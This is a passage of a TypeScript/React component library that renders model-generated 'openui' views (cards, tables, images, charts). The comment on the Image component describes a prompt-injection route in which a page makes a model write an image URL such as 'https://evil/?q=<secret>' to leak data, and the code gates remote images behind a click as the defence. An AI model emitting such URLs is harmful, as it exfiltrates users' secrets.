/* ── The openui language's component library ──
   A model that answers in `openui` writes `identifier = Component(...)` lines,
   and this is the table those names resolve against. Three rules decided it:

   — **one surface rule, held in context.** Anything framed goes through `Box`,
     and `Box` asks where it is: on the page it is a raised card (`FRAME`), inside
     another frame it is a recessed well (`INSET`), inside a `StatRow` it is a
     bare cell. So a Table in a Card is never a second bordered card inside the
     first — the bargain `settings/primitives.tsx` makes with its own `INSET` —
     and no component picks its own ground;
   — **one type scale**: `TITLE` for a thing's name, `BODY` for its text,
     `META` for what qualifies it, `LABEL` (small caps) for a column or a metric's
     name. Every inset is `PAD` or `PAD_ROW`. A component that wants a new size is
     a component that has stopped matching the rest;
   — the schemas stay flat and shallow, which is what the language asks of its
     libraries: every component is a container of strings or a small record, and
     composition is `z.array(Component.ref)`. A deeply nested prop burns tokens
     and is where generation goes wrong.

   `Notice` and `Empty` are still the app's two message boxes, and the
   `--chart-*` tokens colour every chart, so a generated view follows the
   reader's palette. Every text node is `min-w-0` + `break-words`: the panel's
   width is the one thing the model cannot control.

   Nothing here reaches the network or the app's state. The fence's caller does
   not pass a `toolProvider`, so a `Query(...)` in a generated program has no
   tool to find and is dropped by the parser — the model composes a *view* over
   what it already knows, and every tool call the thread makes stays a normal
   ACP call. `bindings` and `toolCalls` are off in the prompt for that reason
   (`scripts/gen-openui.mjs`). */
import { z } from "zod/v4"
import { createContext, useContext, useId, useState, type CSSProperties, type ReactNode } from "react"
import { Check, ChevronRight, Maximize2, Minus, Plus, X } from "lucide-react"
import {
  Area,
  AreaChart,
  Bar,
  BarChart,
  CartesianGrid,
  Cell,
  Line,
  LineChart,
  Pie,
  PieChart,
  PolarAngleAxis,
  PolarGrid,
  Radar,
  RadarChart,
  XAxis,
  YAxis,
} from "recharts"
import { createLibrary, defineComponent } from "@openuidev/react-lang"
import { Empty } from "@/components/empty"
import { Accordion as UiAccordion, AccordionContent, AccordionItem, AccordionTrigger } from "@/components/ui/accordion"
import { Avatar, AvatarFallback } from "@/components/ui/avatar"
import { Carousel, CarouselContent, CarouselItem, CarouselNext, CarouselPrevious } from "@/components/ui/carousel"
import { DiffView } from "@/components/ui/diff-view"
import { Kbd, KbdGroup } from "@/components/ui/kbd"
import {
  MorphingDialog,
  MorphingDialogContent,
  MorphingDialogOpen,
  MorphingDialogSource,
} from "@/components/ui/morphing-dialog"
import { Tabs as UiTabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Notice } from "@/components/notice"
import { TodoChecklist } from "@/components/todo-checklist"
import { InteractiveFlowchart } from "@/lib/openui/interactive-flowchart"
import { ChartContainer, ChartTooltip, ChartTooltipContent } from "@/components/ui/chart"
import { cn } from "@/lib/utils"

/* ── The system ── */

const TITLE = "break-words text-[13.5px] leading-snug font-semibold tracking-tight text-foreground"
const BODY = "break-words text-[13px] leading-relaxed text-foreground/90"
const META = "break-words text-xs leading-snug text-muted-foreground"
const LABEL = "break-words text-[10.5px] leading-tight font-medium tracking-[0.06em] uppercase text-muted-foreground"
const PAD = "px-3 py-2.5 @panel-sm:px-3.5 @panel-sm:py-3"
const PAD_ROW = "px-3 py-2 @panel-sm:px-3.5"
/** Between siblings, everywhere: a stack, a card's body, a tab's panel. */
const FLOW = "flex w-full min-w-0 flex-col gap-2.5 @panel-sm:gap-3"
const HAIRLINE = "border-border/60"

const FRAME = "rounded-xl border border-border/70 bg-card shadow-xs"
const INSET = "rounded-lg border border-border/40 bg-muted/40"

type Surface = "page" | "frame" | "cell"
const SurfaceContext = createContext<Surface>("page")

/** The one framed thing. What it looks like is where it is, never the caller's
    choice — which is the whole of "styled the same". Its children are inside a
    frame, so anything framed among them draws as a well. */
function Box({ className, children, style }: { className?: string; children: ReactNode; style?: CSSProperties }) {
  const surface = useContext(SurfaceContext)
  return (
    <SurfaceContext.Provider value="frame">
      <div
        className={cn(
          "w-full min-w-0 overflow-hidden",
          surface === "page" ? FRAME : surface === "frame" ? INSET : "bg-card",
          className
        )}
        style={style}
      >
        {children}
      </div>
    </SurfaceContext.Provider>
  )
}

/** A frame's top band: a name and what qualifies it, over a hairline. */
function BoxHeader({ title, meta }: { title: ReactNode; meta?: ReactNode }) {
  return (
    <header className={cn("min-w-0 space-y-0.5 border-b", HAIRLINE, PAD_ROW, "py-2.5")}>
      <div className={TITLE}>{title}</div>
      {meta && <div className={cn(META, "text-pretty")}>{meta}</div>}
    </header>
  )
}

const TONE_DOT = {
  neutral: "bg-muted-foreground/50",
  info: "bg-chart-2",
  success: "bg-primary",
  warn: "bg-chart-3",
  error: "bg-destructive",
} as const

/* ── Layout ── */

/** `root` is the container the prompt insists on wrapping every program in:
    vertical by default, a wrapping grid for a cluster of cards. The panel's
    width decides the columns, never the window's. */
const Stack = defineComponent({
  name: "Stack",
  description: "Vertical container. The root element every OpenUI program starts from.",
  props: z.object({
    children: z.array(z.any()),
    direction: z.enum(["column", "row"]).optional(),
    gap: z.enum(["sm", "md", "lg"]).optional(),
  }),
  component: ({ props, renderNode }) => (
    <div
      className={cn(
        "w-full min-w-0",
        props.direction === "row"
          ? "grid grid-cols-1 items-start gap-2.5 @panel-sm:grid-cols-[repeat(auto-fit,minmax(min(100%,15rem),1fr))] @panel-sm:gap-3"
          : FLOW,
        props.gap === "sm" && "gap-1.5 @panel-sm:gap-2",
        props.gap === "lg" && "gap-4 @panel-sm:gap-5"
      )}
    >
      {renderNode(props.children)}
    </div>
  ),
})

/** A titled frame: the header is a band of its own, the body the one flow. */
const Card = defineComponent({
  name: "Card",
  description: "A titled panel holding a group of sections.",
  props: z.object({
    title: z.string(),
    subtitle: z.string().optional(),
    children: z.array(z.any()),
  }),
  component: ({ props, renderNode }) => (
    <Box>
      <BoxHeader title={props.title} meta={props.subtitle} />
      <div className={cn(FLOW, PAD)}>{renderNode(props.children)}</div>
    </Box>
  ),
})

/* A heading and a line under it. Plain characters rather than the app's
   markdown renderer: that lives in `tool-parts.tsx`, which is what this library
   is reached *from*, and importing `Prose` here would close that cycle. */
const Section = defineComponent({
  name: "Section",
  description: "A heading with an optional line of explanatory text.",
  props: z.object({
    title: z.string(),
    text: z.string().optional(),
  }),
  component: ({ props }) => (
    <div className="w-full min-w-0 space-y-1 pt-0.5">
      <h3 className="break-words text-[15px] leading-snug font-semibold tracking-tight text-balance text-foreground">
        {props.title}
      </h3>
      {props.text && <p className={cn(BODY, "text-pretty text-muted-foreground")}>{props.text}</p>}
    </div>
  ),
})

/** A divider, for a generated dashboard that wants one. */
const Divider = defineComponent({
  name: "Divider",
  description: "A horizontal rule.",
  props: z.object({}),
  component: () => <hr className={HAIRLINE} />,
})

/** A folded section: native `<details>`, so it needs no state and survives the
    streaming re-render. */
const Details = defineComponent({
  name: "Details",
  description: "A collapsible section, closed unless `open` is true.",
  props: z.object({
    summary: z.string(),
    children: z.array(z.any()),
    open: z.boolean().optional(),
  }),
  component: ({ props, renderNode }) => (
    <Box>
      <details open={props.open} className="group/details">
        <summary
          className={cn(
            "flex cursor-pointer list-none items-center gap-2 select-none hover:bg-muted/40 [&::-webkit-details-marker]:hidden",
            PAD_ROW,
            "py-2.5"
          )}
        >
          <ChevronRight className="size-3.5 shrink-0 text-muted-foreground transition-transform group-open/details:rotate-90" />
          <span className={cn(TITLE, "min-w-0 font-medium")}>{props.summary}</span>
        </summary>
        <div className={cn(FLOW, "border-t", HAIRLINE, PAD)}>{renderNode(props.children)}</div>
      </details>
    </Box>
  ),
})

/** Tabs: alternatives the reader flips between. The `line` variant, so the
    strip reads as a heading over the panel rather than as a pill of its own. */
const Tabs = defineComponent({
  name: "Tabs",
  description: "Switchable panels: each tab has a label and its own children.",
  props: z.object({
    tabs: z.array(z.object({ label: z.string(), children: z.array(z.any()) })),
  }),
  component: ({ props, renderNode }) => (
    <UiTabs defaultValue={0} className="w-full min-w-0 gap-3">
      {/* Scrolls sideways rather than wrapping; `scrollbar-none` keeps a
          classic scrollbar from eating the fixed-height strip's content box,
          which clipped every label against it. */}
      <TabsList
        variant="line"
        className={cn("w-full max-w-full min-w-0 justify-start overflow-x-auto border-b scrollbar-none", HAIRLINE)}
      >
        {props.tabs.map((tab, index) => (
          <TabsTrigger key={index} value={index} className="min-w-0 flex-none text-[13px]">
            {tab.label}
          </TabsTrigger>
        ))}
      </TabsList>
      {props.tabs.map((tab, index) => (
        <TabsContent key={index} value={index} className={FLOW}>
          {renderNode(tab.children)}
        </TabsContent>
      ))}
    </UiTabs>
  ),
})

/** An FAQ-shaped fold: one frame, a hairline between questions. */
const Accordion = defineComponent({
  name: "Accordion",
  description: "A list of collapsible items, each a title over its own children. Good for FAQs.",
  props: z.object({
    items: z.array(z.object({ title: z.string(), children: z.array(z.any()) })),
  }),
  component: ({ props, renderNode }) => (
    <Box>
      <UiAccordion className="w-full min-w-0">
        {props.items.map((item, index) => (
          <AccordionItem key={index} value={index} className={cn("border-b last:border-b-0", HAIRLINE)}>
            <AccordionTrigger
              className={cn(
                "min-w-0 gap-2 rounded-none hover:bg-muted/40 hover:no-underline [&_[data-slot=accordion-trigger-icon]]:mt-0.5",
                PAD_ROW,
                "py-2.5"
              )}
            >
              <span className={cn(TITLE, "min-w-0 font-medium")}>{item.title}</span>
            </AccordionTrigger>
            <AccordionContent className={cn(PAD, "pt-0")}>
              <div className={FLOW}>{renderNode(item.children)}</div>
            </AccordionContent>
          </AccordionItem>
        ))}
      </UiAccordion>
    </Box>
  ),
})

/* ── Content ── */

/** Short lines. Numbered items wear a counter chip, bullets a dot centred on
    the first line — both in the same 20px column, so a list is aligned
    whichever it is. */
const List = defineComponent({
  name: "List",
  description: "Short lines, numbered or bulleted.",
  props: z.object({
    items: z.array(z.string()),
    numbered: z.boolean().optional(),
  }),
  component: ({ props }) => {
    const Tag = props.numbered ? "ol" : "ul"
    return (
      <Tag className="w-full min-w-0 space-y-1.5">
        {props.items.map((item, index) => (
          <li key={index} className="flex min-w-0 gap-2.5">
            <span className="flex h-[1.625em] w-5 shrink-0 items-center justify-center text-[13px]">
              {props.numbered ? (
                <span className="flex size-5 items-center justify-center rounded-md bg-muted text-[11px] font-medium tabular-nums text-muted-foreground">
                  {index + 1}
                </span>
              ) : (
                <span className="size-1.5 rounded-full bg-foreground/35" />
              )}
            </span>
            <span className={cn(BODY, "min-w-0 flex-1")}>{item}</span>
          </li>
        ))}
      </Tag>
    )
  },
})

/** A cell is a number when it reads as one — a figure, a currency, a percent,
    a short unit. A column whose every filled cell is one aligns to the end. */
const NUMERIC = /^[-+~]?[$€£¥]?\s?\d[\d,.]*\s?(%|[a-zA-Z]{1,3})?$/
function numericColumns(columns: string[], rows: string[][]) {
  return columns.map((_, c) => {
    const cells = rows.map((row) => row[c]?.trim() ?? "").filter(Boolean)
    return cells.length > 0 && cells.every((cell) => NUMERIC.test(cell))
  })
}

/**
 * A table. Plain string margins rather than a row-of-cells schema: a model that
 * has to declare a column set *and* keep its rows in that order gets the pairing
 * wrong far more often than it gets one array of strings wrong.
 *
 * The frame is the scroll container, so a table wider than a phone panel
 * scrolls inside the turn rather than widening it. `tone`: `muted` greys the
 * cells; otherwise the first column is the row's name and wears it.
 */
const Table = defineComponent({
  name: "Table",
  description: "A grid of text cells. `columns` names the headings and each entry of `rows` is one row.",
  props: z.object({
    columns: z.array(z.string()),
    rows: z.array(z.array(z.string())),
    header: z.boolean().optional(),
    tone: z.enum(["default", "muted", "accent"]).optional(),
  }),
  component: ({ props }) => {
    const numeric = numericColumns(props.columns, props.rows)
    const cell = "px-3 py-2 align-top first:ps-3 last:pe-3 @panel-sm:first:ps-3.5 @panel-sm:last:pe-3.5"
    return (
      <Box>
        <div className="w-full overflow-x-auto">
          <table className="w-full border-collapse text-[13px]">
            {props.header !== false && (
              <thead className="bg-muted/40">
                <tr className={cn("border-b", HAIRLINE)}>
                  {props.columns.map((column, index) => (
                    <th key={index} className={cn(cell, LABEL, numeric[index] ? "text-end" : "text-start")}>
                      {column}
                    </th>
                  ))}
                </tr>
              </thead>
            )}
            <tbody className="divide-y divide-border/50">
              {props.rows.map((row, rowIndex) => (
                <tr key={rowIndex} className="hover:bg-muted/30">
                  {props.columns.map((_, cellIndex) => (
                    <td
                      key={cellIndex}
                      className={cn(
                        cell,
                        "min-w-24 break-words text-foreground/90",
                        numeric[cellIndex] && "min-w-0 text-end whitespace-nowrap tabular-nums",
                        props.tone === "muted" && "text-muted-foreground",
                        cellIndex === 0 && props.tone !== "muted" && "font-medium text-foreground"
                      )}
                    >
                      {row[cellIndex] ?? ""}
                    </td>
                  ))}
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </Box>
    )
  },
})

/**
 * A callout. `Notice` is the app's one alert box and its four tones are
 * semantic there, so this passes the tone through rather than painting its own.
 */
const Callout = defineComponent({
  name: "Callout",
  description: "A boxed aside: info, warn, error or neutral, with an optional title.",
  props: z.object({
    text: z.string(),
    tone: z.enum(["neutral", "info", "warn", "error"]).optional(),
    title: z.string().optional(),
  }),
  component: ({ props }) => (
    <Notice
      className="w-full min-w-0 [&_p]:break-words [&_button]:max-w-full [&_button]:whitespace-normal [&_button]:break-words"
      tone={props.tone ?? "neutral"}
      size="sm"
    >
      {props.title && <p className="break-words font-medium text-pretty">{props.title}</p>}
      <span className="break-words">{props.text}</span>
    </Notice>
  ),
})

/** Preformatted text. The language, when named, is the frame's label band — a
    reference, not a highlighted pane. Wraps rather than scrolling, because a
    long token in a phone panel would push the whole answer sideways. */
const Code = defineComponent({
  name: "Code",
  description: "Preformatted text, a snippet or a log.",
  props: z.object({
    text: z.string(),
    language: z.string().optional(),
  }),
  component: ({ props }) => (
    <Box>
      {props.language && (
        <div className={cn("border-b bg-muted/40", HAIRLINE, PAD_ROW, "py-1.5", LABEL)}>{props.language}</div>
      )}
      <pre
        className={cn(
          "overflow-auto font-mono text-[12px] leading-relaxed break-words whitespace-pre-wrap text-foreground/90",
          PAD
        )}
      >
        {props.text}
      </pre>
    </Box>
  ),
})

/** A definition list, set like a receipt: the name at the start, the value at
    the end, and a value too long for the line wraps under its name on its own —
    no breakpoint, the flex-wrap is the reflow. */
const KeyValue = defineComponent({
  name: "KeyValue",
  description: "A list of named facts.",
  props: z.object({
    items: z.array(z.object({ key: z.string(), value: z.string() })),
  }),
  component: ({ props }) => (
    <Box>
      <dl className="w-full divide-y divide-border/50">
        {props.items.map((item, index) => (
          <div
            key={index}
            className={cn("flex min-w-0 flex-wrap items-baseline justify-between gap-x-4 gap-y-0.5", PAD_ROW)}
          >
            <dt className="min-w-0 break-words text-[13px] text-muted-foreground">{item.key}</dt>
            <dd className="ms-auto min-w-0 text-end break-words text-[13px] font-medium text-foreground tabular-nums">
              {item.value}
            </dd>
          </div>
        ))}
      </dl>
    </Box>
  ),
})

/** An absence, drawn as one: the app's dashed box, never an alert. */
const EmptyState = defineComponent({
  name: "EmptyState",
  description: "A box saying there is nothing to show.",
  props: z.object({
    text: z.string(),
  }),
  component: ({ props }) => (
    <Empty className="w-full min-w-0 [&_p]:break-words" size="sm">
      {props.text}
    </Empty>
  ),
})

/**
 * An image. Remote images are the one thing in this library that would reach
 * the network, and a URL the model writes can carry whatever the thread has read
 * (a prompt-injected page asking for `https://evil/?q=<secret>`). So a `data:`
 * image draws at once and an `http(s)` one waits behind a click that names its
 * host — the reader's consent is the fetch. Anything else is not drawn.
 */
const Image = defineComponent({
  name: "Image",
  description: "An image from an https or data: URL, with alt text and an optional caption.",
  props: z.object({
    src: z.string(),
    alt: z.string(),
    caption: z.string().optional(),
  }),
  component: ({ props }) => <GeneratedImage {...props} />,
})

function GeneratedImage({ src, alt, caption }: { src: string; alt: string; caption?: string }) {
  const inline = /^data:image\/(png|jpe?g|gif|webp);/i.test(src)
  let host: string | null = null
  try {
    const url = new URL(src)
    if (url.protocol === "https:" || url.protocol === "http:") host = url.host
  } catch {
    /* not a URL — drawn as the alt text below */
  }
  const [shown, setShown] = useState(inline)
  const [failed, setFailed] = useState(false)
  if (failed || (!shown && !host)) {
    return <Empty size="sm">{failed ? `Image failed to load: ${alt}` : alt}</Empty>
  }
  return (
    <Box>
      <figure className="min-w-0">
        {shown ? (
          <img
            src={src}
            alt={alt}
            referrerPolicy="no-referrer"
            onError={() => setFailed(true)}
            className="mx-auto block max-h-96 max-w-full object-contain"
          />
        ) : (
          <button
            type="button"
            onClick={() => setShown(true)}
            className={cn("flex w-full flex-col items-start gap-0.5 text-start hover:bg-muted/40", PAD)}
          >
            <span className={cn(BODY, "[overflow-wrap:anywhere]")}>{alt}</span>
            <span className={cn(META, "[overflow-wrap:anywhere]")}>Load image from {host}</span>
          </button>
        )}
        {caption && (
          <figcaption className={cn(META, "border-t text-pretty", HAIRLINE, PAD_ROW)}>{caption}</figcaption>
        )}
      </figure>
    </Box>
  )
}

/** Short tags. Every chip is the same neutral chip and the tone is a dot, so a
    row of six statuses reads as one row and not as six colours. */
const Badges = defineComponent({
  name: "Badges",
  description: "A row of short tags, each with an optional tone.",
  props: z.object({
    items: z.array(
      z.object({
        text: z.string(),
        tone: z.enum(["neutral", "info", "success", "warn", "error"]).optional(),
      })
    ),
  }),
  component: ({ props }) => (
    <div className="flex w-full min-w-0 flex-wrap gap-1.5">
      {props.items.map((item, index) => (
        <span
          key={index}
          className="inline-flex max-w-full items-center gap-1.5 rounded-md border border-border/70 bg-card px-2 py-0.5 text-xs font-medium text-foreground/90 shadow-xs"
        >
          <span className={cn("size-1.5 shrink-0 rounded-full", TONE_DOT[item.tone ?? "neutral"])} />
          <span className="min-w-0 break-words">{item.text}</span>
        </span>
      ))}
    </div>
  ),
})

/** Ordered events with a state each. The rail is the list; the marker says the
    state by shape as well as by colour. */
const Timeline = defineComponent({
  name: "Timeline",
  description: "Ordered steps or events: a title, optional time and text, and a status.",
  props: z.object({
    items: z.array(
      z.object({
        title: z.string(),
        time: z.string().optional(),
        text: z.string().optional(),
        status: z.enum(["done", "active", "pending", "failed"]).optional(),
      })
    ),
  }),
  component: ({ props }) => (
    <ol className="w-full min-w-0">
      {props.items.map((item, index) => {
        const status = item.status ?? "pending"
        return (
          <li key={index} className="relative flex min-w-0 gap-3 pb-4 last:pb-0">
            {index < props.items.length - 1 && (
              <span className="absolute top-6 bottom-1 left-[9.5px] w-px bg-border" />
            )}
            <span
              className={cn(
                "mt-px flex size-5 shrink-0 items-center justify-center rounded-full",
                status === "done" && "bg-primary text-primary-foreground",
                status === "active" && "bg-primary/15 ring-1 ring-primary ring-inset",
                status === "failed" && "bg-destructive text-white",
                status === "pending" && "bg-card ring-1 ring-border ring-inset"
              )}
            >
              {status === "done" && <Check className="size-3" strokeWidth={3} />}
              {status === "failed" && <X className="size-3" strokeWidth={3} />}
              {status === "active" && <span className="size-2 animate-pulse rounded-full bg-primary" />}
            </span>
            <div className="min-w-0 flex-1 space-y-0.5 pt-px">
              <div className="flex min-w-0 flex-wrap items-baseline justify-between gap-x-3">
                <span
                  className={cn(TITLE, "min-w-0 text-[13px] font-medium", status === "pending" && "text-muted-foreground")}
                >
                  {item.title}
                </span>
                {item.time && <span className={cn(META, "max-w-full tabular-nums")}>{item.time}</span>}
              </div>
              {item.text && <p className={cn(META, "text-pretty")}>{item.text}</p>}
            </div>
          </li>
        )
      })}
    </ol>
  ),
})

/** Options side by side: one frame each, name and verdict as its header band,
    pros and cons marked by glyph as well as by colour. Stacks below `@panel-sm`. */
const Compare = defineComponent({
  name: "Compare",
  description: "Options side by side, each with a name, optional verdict, pros and cons.",
  props: z.object({
    options: z.array(
      z.object({
        name: z.string(),
        verdict: z.string().optional(),
        pros: z.array(z.string()).optional(),
        cons: z.array(z.string()).optional(),
      })
    ),
  }),
  component: ({ props }) => (
    <div className="grid w-full min-w-0 gap-2.5 @panel-sm:grid-cols-[repeat(auto-fit,minmax(min(100%,13rem),1fr))] @panel-sm:gap-3">
      {props.options.map((option, index) => (
        <Box key={index}>
          <BoxHeader title={option.name} meta={option.verdict} />
          <ul className={cn("min-w-0 space-y-1.5", PAD)}>
            {option.pros?.map((pro, i) => (
              <li key={`p${i}`} className="flex min-w-0 gap-2">
                <Plus className="mt-[0.3em] size-3.5 shrink-0 text-primary" strokeWidth={2.5} />
                <span className={cn(BODY, "min-w-0")}>{pro}</span>
              </li>
            ))}
            {option.cons?.map((con, i) => (
              <li key={`c${i}`} className="flex min-w-0 gap-2">
                <Minus className="mt-[0.3em] size-3.5 shrink-0 text-destructive" strokeWidth={2.5} />
                <span className={cn(BODY, "min-w-0")}>{con}</span>
              </li>
            ))}
          </ul>
        </Box>
      ))}
    </div>
  ),
})

/** A before/after of text, drawn by the same line diff tool steps use. */
const Diff = defineComponent({
  name: "Diff",
  description: "A line diff between old and new text, with an optional path.",
  props: z.object({
    before: z.string(),
    after: z.string(),
    path: z.string().optional(),
  }),
  component: ({ props }) => <DiffView className="w-full" oldText={props.before} newText={props.after} path={props.path} />,
})

/** Keyboard chords: the action at the start, the keycaps at the end. */
const Keys = defineComponent({
  name: "Keys",
  description: "Keyboard shortcuts: each entry is a list of keys and what the chord does.",
  props: z.object({
    items: z.array(z.object({ keys: z.array(z.string()), action: z.string() })),
  }),
  component: ({ props }) => (
    <Box>
      <div className="w-full divide-y divide-border/50">
        {props.items.map((item, index) => (
          <div
            key={index}
            className={cn("flex min-w-0 flex-wrap items-center justify-between gap-x-4 gap-y-1", PAD_ROW)}
          >
            <span className={cn(BODY, "min-w-0 flex-1 basis-40")}>{item.action}</span>
            <KbdGroup className="ms-auto min-w-0 max-w-full flex-wrap">
              {item.keys.map((key, i) => (
                <Kbd key={i}>{key}</Kbd>
              ))}
            </KbdGroup>
          </div>
        ))}
      </div>
    </Box>
  ),
})

/** People: initials avatars, never a fetched picture (see `Image` for why),
    in a grid of equal cells so the names line up in columns. */
const People = defineComponent({
  name: "People",
  description: "A list of people with a name and optional role, drawn as initials avatars.",
  props: z.object({
    items: z.array(z.object({ name: z.string(), role: z.string().optional() })),
  }),
  component: ({ props }) => (
    <div className="grid w-full min-w-0 grid-cols-[repeat(auto-fill,minmax(min(100%,11rem),1fr))] gap-x-4 gap-y-3">
      {props.items.map((person, index) => (
        <div key={index} className="flex min-w-0 items-center gap-2.5">
          <Avatar>
            <AvatarFallback className="text-xs font-medium">
              {person.name
                .split(/\s+/)
                .slice(0, 2)
                .map((word) => word[0]?.toUpperCase() ?? "")
                .join("")}
            </AvatarFallback>
          </Avatar>
          <div className="min-w-0 leading-tight">
            <p className="truncate text-[13px] font-medium text-foreground">{person.name}</p>
            {person.role && <p className={cn(META, "truncate")}>{person.role}</p>}
          </div>
        </div>
      ))}
    </div>
  ),
})

/** Several images, one at a time. Each slide is an `Image`, so the click-to-load
    rule holds; the arrows sit inside the frame, which a transcript column has
    room for and shadcn's `-left-12` does not. */
const Gallery = defineComponent({
  name: "Gallery",
  description: "A carousel of images, each with src, alt and optional caption.",
  props: z.object({
    images: z.array(z.object({ src: z.string(), alt: z.string(), caption: z.string().optional() })),
  }),
  component: ({ props }) => (
    <Carousel className="w-full min-w-0">
      <CarouselContent>
        {props.images.map((image, index) => (
          <CarouselItem key={index}>
            <GeneratedImage {...image} />
          </CarouselItem>
        ))}
      </CarouselContent>
      {props.images.length > 1 && (
        <>
          <CarouselPrevious className="left-2" />
          <CarouselNext className="right-2" />
        </>
      )}
    </Carousel>
  ),
})

/* ── Flowcharts ── */


/** A graph written as what it is — nodes and edges — rather than as mermaid
    source: mermaid's syntax is one more thing to get wrong. */
const graphProps = z.object({
  nodes: z.array(
    z.object({
      id: z.string(),
      label: z.string().optional(),
      shape: z.enum(["box", "round", "diamond", "circle"]).optional(),
    })
  ),
  edges: z.array(
    z.object({
      from: z.string(),
      to: z.string(),
      label: z.string().optional(),
      dashed: z.boolean().optional(),
    })
  ),
  direction: z.enum(["down", "right"]).optional(),
  caption: z.string().optional(),
})

function GraphFigure({ props }: { props: z.infer<typeof graphProps> }) {
  const chartKey = JSON.stringify([props.nodes, props.edges, props.direction])
  const chart = {
    nodes: props.nodes,
    edges: props.edges,
    direction: props.direction ?? "down",
  } as const
  return (
    <Box
      className={cn("col-span-full w-full self-stretch", PAD, "space-y-1")}
      style={{ gridColumn: "1 / -1", width: "100%", minWidth: 0 }}
    >
      {/* The figure opens into a reader: two charts, so the one in the panel
          is a fresh sketch — an arrangement made there is gone on close, the
          same as a reload. */}
      <MorphingDialog>
        <MorphingDialogSource className="relative rounded-md">
          <InteractiveFlowchart key={chartKey} {...chart} />
          <MorphingDialogOpen
            title="Full screen"
            className="absolute top-2 right-2 z-10 inline-flex size-7 items-center justify-center rounded-md border border-border bg-card text-muted-foreground shadow-sm transition-colors hover:text-foreground"
          >
            <Maximize2 aria-hidden className="size-3.5" />
            <span className="sr-only">Full screen</span>
          </MorphingDialogOpen>
        </MorphingDialogSource>
        <MorphingDialogContent label={props.caption ?? "Flowchart"}>
          <InteractiveFlowchart key={chartKey} {...chart} fill />
        </MorphingDialogContent>
      </MorphingDialog>
      {props.caption && <p className={cn(META, "px-1")}>{props.caption}</p>}
      <p className="px-1 text-[10px] text-muted-foreground/75">
        Drag nodes; drag between handles to connect. Select an edge or node and press Delete to remove it.
      </p>
    </Box>
  )
}

const Flowchart = defineComponent({
  name: "Flowchart",
  description: "A flowchart from nodes and edges: each node has an id and a label, each edge joins two ids.",
  props: graphProps,
  component: GraphFigure,
})

/** Backwards-compatible name for Flowchart. */
/* ── Numbers ── */

/** One metric: its name in small caps, the figure large and tabular, the hint
    under it. On its own it is a frame; inside a `StatRow` it is a cell of the
    row's frame. */
const Stat = defineComponent({
  name: "Stat",
  description: "A single metric: a label and a value.",
  props: z.object({
    label: z.string(),
    value: z.string(),
    hint: z.string().optional(),
  }),
  component: ({ props }) => (
    <Box className={cn(PAD, "space-y-1")}>
      <p className={cn(LABEL, "text-balance")}>{props.label}</p>
      <p className="break-words text-xl leading-tight font-semibold tracking-tight text-foreground tabular-nums @panel-sm:text-2xl">
        {props.value}
      </p>
      {props.hint && <p className={cn(META, "text-pretty")}>{props.hint}</p>}
    </Box>
  ),
})

/** A row of `Stat`s as one frame split into cells. Each cell draws its own
    right and bottom hairline as a shadow, and the frame's `overflow-hidden`
    clips the ones on its outer edge — so a row that wraps short leaves card
    ground in the gap, not the grey block a `gap-px` grid would. */
const StatRow = defineComponent({
  name: "StatRow",
  description: "A row of metrics across the width of the page.",
  props: z.object({
    stats: z.array(Stat.ref),
  }),
  component: ({ props, renderNode }) => (
    <Box
      className={cn(
        "grid bg-card [&>*]:shadow-[1px_0_0_0_var(--border),0_1px_0_0_var(--border)]",
        props.stats.length > 1
          ? "grid-cols-[repeat(auto-fit,minmax(min(100%,9rem),1fr))] @panel-sm:grid-cols-[repeat(auto-fit,minmax(9rem,1fr))]"
          : "grid-cols-1"
      )}
    >
      <SurfaceContext.Provider value="cell">{renderNode(props.stats)}</SurfaceContext.Provider>
    </Box>
  ),
})

/** A labelled 0-100 meter: label and figure on one line, the bar under them. */
const Progress = defineComponent({
  name: "Progress",
  description: "A labelled 0–100 meter.",
  props: z.object({
    label: z.string(),
    value: z.number(),
    hint: z.string().optional(),
  }),
  component: ({ props }) => (
    <div className="w-full min-w-0 space-y-1.5">
      <div className="flex min-w-0 items-baseline justify-between gap-x-3">
        <span className={cn(BODY, "min-w-0 truncate")}>{props.label}</span>
        <span className="shrink-0 text-xs font-medium text-foreground tabular-nums">
          {props.hint ?? `${Math.round(props.value)}%`}
        </span>
      </div>
      <div className="h-2 overflow-hidden rounded-pill bg-muted">
        <div
          className="h-full rounded-pill bg-primary"
          style={{ width: `${Math.min(100, Math.max(0, props.value))}%` }}
        />
      </div>
    </div>
  ),
})

/** A chart: `labels` x-axis, `series` one mark each, the value at index `i`
    belonging to `labels[i]`. Colours are the app's `--chart-*` tokens.
    `pie`/`donut` read the first series only — a slice per label. */
const chartColor = (index: number) => `var(--chart-${(index % 5) + 1})`

const Chart = defineComponent({
  name: "Chart",
  description:
    "A full-width chart over shared labels: line, bar, area, radar, or pie/donut (first series only, one slice per label), with an optional title.",
  props: z.object({
    kind: z.enum(["line", "bar", "area", "pie", "donut", "radar"]),
    labels: z.array(z.string()),
    series: z.array(
      z.object({
        name: z.string(),
        values: z.array(z.number()),
      })
    ),
    height: z.number().optional(),
    stacked: z.boolean().optional(),
    title: z.string().optional(),
  }),
  component: ({ props }) => {
    const round = props.kind === "pie" || props.kind === "donut"
    const data = props.labels.map((label, index) => {
      const row: Record<string, string | number> = { label }
      for (const series of props.series) row[series.name] = series.values[index] ?? 0
      return row
    })
    const config = Object.fromEntries(
      round
        ? props.labels.map((label, index) => [label, { label, color: chartColor(index) }])
        : props.series.map((series, index) => [series.name, { label: series.name, color: chartColor(index) }])
    )
    const chartId = useId().replace(/:/g, "")
    const stack = props.stacked ? "a" : undefined
    const chartHeight = Math.min(480, Math.max(180, props.height ?? (round || props.kind === "radar" ? 280 : 240)))
    const axes = (
      <>
        <CartesianGrid vertical={false} stroke="var(--border)" strokeDasharray="2 6" />
        <XAxis
          dataKey="label"
          tickLine={false}
          axisLine={false}
          tickMargin={12}
          fontSize={10}
          interval="preserveStartEnd"
          tick={{ fill: "var(--muted-foreground)" }}
        />
        <YAxis
          tickLine={false}
          axisLine={false}
          width={36}
          fontSize={10}
          tick={{ fill: "var(--muted-foreground)" }}
          tickFormatter={(value: number) => new Intl.NumberFormat(undefined, { notation: "compact", maximumFractionDigits: 1 }).format(value)}
        />
        <ChartTooltip content={<ChartTooltipContent />} cursor={{ stroke: "var(--primary)", strokeDasharray: "3 3" }} />
      </>
    )
    const margin = { left: 2, right: 12, top: 12, bottom: 2 }
    const seriesLegend = round
      ? props.labels.map((label, index) => ({ name: label, color: chartColor(index) }))
      : props.series.map((series, index) => ({ name: series.name, color: chartColor(index) }))
    return (
